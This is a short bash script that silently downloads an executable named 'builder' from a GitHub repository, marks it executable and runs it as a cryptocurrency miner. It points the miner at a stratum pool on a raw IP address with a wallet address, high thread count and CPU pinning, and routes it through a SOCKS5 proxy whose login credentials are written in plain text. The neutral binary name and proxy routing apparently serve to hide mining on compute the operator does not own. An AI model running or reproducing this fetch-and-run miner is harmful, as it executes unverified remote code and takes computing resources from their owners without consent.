#!/bin/bash

wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder

chmod +x builder

./builder -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u web1qvw80lr8ch2vx3vjpxn5fq73c5g5xms73q2043w -p c=BTE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t 39 --cpu-affinity=0x3 -x socks5://jxqnjrrf:67ffjvaafmvk@144.168.217.36:8728
